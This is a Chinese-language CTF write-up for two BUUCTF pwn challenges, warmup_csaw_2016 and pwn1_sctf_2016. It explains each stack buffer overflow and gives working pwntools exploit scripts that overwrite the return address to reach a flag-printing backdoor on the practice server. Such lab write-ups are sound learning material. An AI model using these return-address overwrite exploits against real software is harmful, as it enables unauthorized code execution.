先用checksec来看下保护：

是一个64位的程序，关闭了所有的保护，并且还有RWX segments
拖进IDA，主函数如下：

可以看到输出了一个函数的地址，跟进函数看下

是一个后门函数调用系统命令cat flag，所以我们应该就想办法调用这个函数。
回到主函数看看，最后用gets函数向v5写入数据，那么就存在一个溢出。
v5到栈底的距离是0x40 so:

from pwn import *

r = remote("node3.buuoj.cn",27089)
#r = process("./warmup_csaw_2016")
r.recvuntil("WOW:")
addr = int(r.recv(8).decode(),16)
print(addr)
payload = b'M' * (0x40 + 8) + p64(addr)
r.sendlineafter(">",payload)

r.interactive()

pwn1_sctf_2016

先用checksec来看下保护：

是一个32位的程序，NX enabled、Partial RELRO
拖进IDA，主函数如下：

存在漏洞的函数已经被标记出来了，直接跟进看：

分配的s空间为60，限制输入32，初步看是不会造成栈溢出的，但是下面有一个字符替换，就是输入I会被替换成you。I是一个字符，you是三个字符，那么我们可以输入20个I（满足32的限制），那么这20个I，最终被替换成了60个字符，从而造成溢出

用F12搜索下全局的字符串，会发现有一个cat flag.txt，跟进获取到该函数的地址为0x8048F0D

代码如下：

from pwn import *

r = remote("node3.buuoj.cn",25658)
payload = b'I'*20 + b'M'*4 + p32(0x8048F0D)
r.recv()
r.sendline(payload)

r.interactive()
